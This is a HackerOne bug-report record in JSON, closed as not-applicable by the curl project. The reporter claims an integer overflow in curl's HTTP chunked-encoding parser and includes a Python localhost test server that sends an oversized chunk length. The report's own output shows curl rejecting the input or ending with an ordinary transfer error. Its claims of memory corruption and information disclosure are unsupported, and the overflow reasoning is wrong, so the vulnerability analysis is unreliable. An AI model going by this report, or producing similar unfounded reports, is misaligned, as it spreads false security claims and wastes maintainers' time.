{
  "id": 3344663,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzQ0NjYz",
  "url": "https://hackerone.com/reports/3344663",
  "title": "Security Analysis Report: CURL Integer Overflow Vulnerability",
  "state": "Closed",
  "substate": "not-applicable",
  "readable_substate": "N/A",
  "created_at": "2025-09-17T19:53:15.610Z",
  "submitted_at": "2025-09-17T19:53:15.879Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jfhgdsjkf",
    "url": "/jfhgdsjkf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/0qp03epmt8m31rm21140clfrnkd9/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2025-09-18T09:33:39.052Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2025-09-18T06:08:30.893Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "1. Vulnerability Overview\nVulnerability Type: Integer Overflow in HTTP chunked encoding\nLocation in Source:\n```\nlib/http_chunks.c (line 173)\nlib/curlx/strparse.c (lines 185–186)\n```\nImpact:\nInteger overflow leads to memory corruption\nCan cause buffer overflow\nResults in Denial of Service (DoS) for curl\nPotential for information disclosure under controlled conditions\nCode Snippet Demonstrating the Issue\n```\n// http_chunks.c line 173\nif(curlx_str_hex(&p, &ch->datasize, CURL_OFF_T_MAX)) {\n    // Error handling\n}\n// strparse.c lines 185-186\nif(num > ((max - n) / base))\n    return STRE_OVERFLOW;\nnum = num * base + n;\n```\n\nProblem:\nThe overflow check can be bypassed when max = CURL_OFF_T_MAX (0x7FFFFFFFFFFFFFFF). This allows num to exceed the maximum value without triggering the overflow protection, leading to memory corruption when curl processes chunked responses.\n\n\nTest Setup\nPython test server simulating vulnerable behavior:\n\n```\n#!/usr/bin/env python3\n\nimport socket\nimport threading\n\ndef create_test_response():\n    overflow_chunk_size = \"7FFFFFFFFFFFFFFFF\"\n    \n    html_content = \"<html><body><h1>Overflow Test Page</h1><p>If you see this, curl continued reading.</p></body></html>\"\n    \n    response = (\n        \"HTTP/1.1 200 OK\\r\\n\"\n        \"Transfer-Encoding: chunked\\r\\n\"\n        \"Content-Type: text/html\\r\\n\"\n        \"Connection: close\\r\\n\"\n        \"\\r\\n\"\n        f\"{overflow_chunk_size}\\r\\n\"  \n        \"VULNERABILITY_PROOF_DATA\\r\\n\"  \n        f\"{len(html_content):X}\\r\\n\"  \n        f\"{html_content}\\r\\n\"  \n        \"0\\r\\n\"  \n        \"\\r\\n\"\n    )\n    return response.encode()\ndef handle_client(client_socket, addr):\n    print(f\"[+] Connection from {addr}\")\n    try:\n        request = client_socket.recv(1024)\n        print(f\"[+] Sending test response with overflow and HTML chunk...\")\n        response = create_test_response()\n        client_socket.send(response)\n        print(f\"[+] Response sent!\")\n    except Exception as e:\n        print(f\"[-] Error: {e}\")\n    finally:\n        client_socket.close()\ndef start_test_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    \n    try:\n        server.bind(('127.0.0.1', 8080))\n        server.listen(5)\n        print(\"=\" * 60)\n        print(\"CURL INTEGER OVERFLOW TEST CONTINUATION \")\n        print(\"=\" * 60)\n        print(\"Server running on port 8080\")\n        print(\"After sending overflow chunk, HTML chunk will follow\")\n        print(\"Run: curl  http://127.0.0.1:8080\")\n        print(\"=\" * 60)\n        \n        while True:\n            client_socket, addr = server.accept()\n            client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))\n            client_thread.daemon = True\n            client_thread.start()\n    except KeyboardInterrupt:\n        print(\"\\n[+] Server stopped\")\n    finally:\n        server.close()\n\nif __name__ == \"__main__\":\n    start_test_server()\n\n\n```\ncurl  http://127.0.0.1:8080\n\nF1:F4796194\n\nchrome\nF1:F4796193\n\n\noverflow_chunk_size = \"7FFFFFFFFFFFFFFFF\" \n```\n└─$ curl http://127.0.0.1:8080\ncurl: (56) chunk hex-length longer than 16\n\n```\n\n\noverflow_chunk_size = \"7FFFFFFFFFFFFFFF\" \n\n```\n└─$ curl http://127.0.0.1:8080\nVULNERABILITY_PROOF_DATA\n64\n<html><body><h1>Overflow Test Page</h1><p>If you see this, curl continued reading.</p></body></html>\n0\ncurl: (18) transfer closed with outstanding read data remaining\n└─$ \n```\n\n## Impact\n\nInteger overflow leads to memory corruption\nCan cause buffer overflow\nResults in Denial of Service (DoS) for curl\nPotential for information disclosure under controlled conditions\nCode Snippet Demonstrating the Issue",
  "weakness": {
    "id": 15,
    "name": "Integer Overflow"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 4796193,
      "file_name": "curl2.PNG",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/drkz61juwh100fw6993hjwmnml7n?response-content-disposition=attachment%3B%20filename%3D%22curl2.PNG%22%3B%20filename%2A%3DUTF-8%27%27curl2.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQKT27YE7%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T162705Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCol514S6H6N74sS333H88P0VOEwSJ5ZTfhMDY8aZnfyQIgYEz3uNKfKr%2BFnxLwaNlW1zaVKhxcJU9atJNjIeminA8qugUI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDMYzAr3oZXS4Nb3nXCqOBZ%2BrvrNTpyZNe7uI8iesSXO2NggEsysUBZ8qmUIBkmmWB4%2FBpBBU2j%2FxJKJgfNrJfl18B1tUEJ86v9cIB4BIVb7R9r10gavyNY8wU2maNJ1lY%2Fx1v1vghiGgvgrJEQ4APajvm91bHe3nmlGr6BOQy3uVpIaPe2rHMvssft8WzYE%2BWOgnQI%2BJf4BJcfS5HH3gbhnMJKBYTUQfWTOdldt8XbXAFtxEfTa3tWQSzEVTHUf48nH4dmQPvWVStrvX5SGuo6GVN5R8mJC9bAGOnHamAS7ejCop1%2BWdesrYcBhZfzkyLRuc%2BGbxWNi7Ya4zWqJ8x6ZHw%2BSdrnngfehNwj9qJOyOvQASdKhhONmuYi5I4DKCjUkXC%2FygolGQpUuTcsEqAtQfH3k5OQo8OebDuNiEcT7wGrhnFfT2qqLRV6MEiN52tmTKNPquguzMcjEcVgSPu4%2BYuibYQXypoK2q%2FiQ3YM7lx0ICfQ3REdydqo%2Bl7wzu8rxyCSC5gjaBFV0p4UZDHdiCavQYUUHZoH0VmHC62ncGxrfqh4WHjBRgKt%2Fk1vNPbShpFpi8vxHDdi%2BOadgy0UGwgSro6cjPRDSe9M7mfDm4koB2qe5DifXnALcyWU5aH4JrRIowdyMlimb69ICFtoDL9ZEneICXpdRq42%2BZfoLEJhmllsTVze%2F%2FpCD2VXTxFfawV6mUx1xZCeJkQnMDY0ZFIIMDmuAa6VVRgNGNITKmcy3lCNFTYY8CoO%2FMbGEnHbAHoACwpu%2FrCWkEN5Kn4GeAfsfaUXkJ73VIsBsSlAa%2FcXTW%2BpieiqwO%2F%2BDxp5Ub1aPkJ08xeyaGhEMCg5Eia5l%2F5EteeSpj5WmHDu8c5EcTDoQ3TUUQ3zKtl2YW%2FTDR6brGBjqxAVQGF6ztHeY0xrhTjNvpNdDJ0QuVff1zQyq6ejiqUupgwRha80yIWHtyBAfA8LAHlF8Apwq04r%2BrcY%2FPyqzePm9WBePn3nhBoNDRvCP7iHQWSbwbfoAlEJUQBTYT1rh9u2TFHrprObAGhJAOEFyshv8rFYbFVBxoLSfWYYSM0LV4WUUm54xq8LWKwANUGzxpyeBQfxIuDv3VTWefl014TMWi0Ix7%2FOU9rm%2BmH0816qlN5w%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=753bfd365f8538b45078340e96cb61365e2a600d508f106bf7c2e2342b1b9d5f",
      "file_size": 20220,
      "type": "image/png",
      "moderated": false
    },
    {
      "id": 4796194,
      "file_name": "curl1.PNG",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ad2cysckbh9996tswpffiqmd6163?response-content-disposition=attachment%3B%20filename%3D%22curl1.PNG%22%3B%20filename%2A%3DUTF-8%27%27curl1.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQKT27YE7%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T162705Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCol514S6H6N74sS333H88P0VOEwSJ5ZTfhMDY8aZnfyQIgYEz3uNKfKr%2BFnxLwaNlW1zaVKhxcJU9atJNjIeminA8qugUI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDMYzAr3oZXS4Nb3nXCqOBZ%2BrvrNTpyZNe7uI8iesSXO2NggEsysUBZ8qmUIBkmmWB4%2FBpBBU2j%2FxJKJgfNrJfl18B1tUEJ86v9cIB4BIVb7R9r10gavyNY8wU2maNJ1lY%2Fx1v1vghiGgvgrJEQ4APajvm91bHe3nmlGr6BOQy3uVpIaPe2rHMvssft8WzYE%2BWOgnQI%2BJf4BJcfS5HH3gbhnMJKBYTUQfWTOdldt8XbXAFtxEfTa3tWQSzEVTHUf48nH4dmQPvWVStrvX5SGuo6GVN5R8mJC9bAGOnHamAS7ejCop1%2BWdesrYcBhZfzkyLRuc%2BGbxWNi7Ya4zWqJ8x6ZHw%2BSdrnngfehNwj9qJOyOvQASdKhhONmuYi5I4DKCjUkXC%2FygolGQpUuTcsEqAtQfH3k5OQo8OebDuNiEcT7wGrhnFfT2qqLRV6MEiN52tmTKNPquguzMcjEcVgSPu4%2BYuibYQXypoK2q%2FiQ3YM7lx0ICfQ3REdydqo%2Bl7wzu8rxyCSC5gjaBFV0p4UZDHdiCavQYUUHZoH0VmHC62ncGxrfqh4WHjBRgKt%2Fk1vNPbShpFpi8vxHDdi%2BOadgy0UGwgSro6cjPRDSe9M7mfDm4koB2qe5DifXnALcyWU5aH4JrRIowdyMlimb69ICFtoDL9ZEneICXpdRq42%2BZfoLEJhmllsTVze%2F%2FpCD2VXTxFfawV6mUx1xZCeJkQnMDY0ZFIIMDmuAa6VVRgNGNITKmcy3lCNFTYY8CoO%2FMbGEnHbAHoACwpu%2FrCWkEN5Kn4GeAfsfaUXkJ73VIsBsSlAa%2FcXTW%2BpieiqwO%2F%2BDxp5Ub1aPkJ08xeyaGhEMCg5Eia5l%2F5EteeSpj5WmHDu8c5EcTDoQ3TUUQ3zKtl2YW%2FTDR6brGBjqxAVQGF6ztHeY0xrhTjNvpNdDJ0QuVff1zQyq6ejiqUupgwRha80yIWHtyBAfA8LAHlF8Apwq04r%2BrcY%2FPyqzePm9WBePn3nhBoNDRvCP7iHQWSbwbfoAlEJUQBTYT1rh9u2TFHrprObAGhJAOEFyshv8rFYbFVBxoLSfWYYSM0LV4WUUm54xq8LWKwANUGzxpyeBQfxIuDv3VTWefl014TMWi0Ix7%2FOU9rm%2BmH0816qlN5w%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=22c3bacba6c0a04393281cc92adc87877532decfec7c570d7934e392414a4997",
      "file_size": 125135,
      "type": "image/png",
      "moderated": false
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 10,
  "voters": [
    "2026",
    "hackvegas001",
    "whitehatethicalhacker_pathum_p",
    "chenlvtang",
    "stackraid",
    "aryanstha",
    "0xdark1",
    "jfhgdsjkf",
    "lawwag",
    "llambduh"
  ],
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
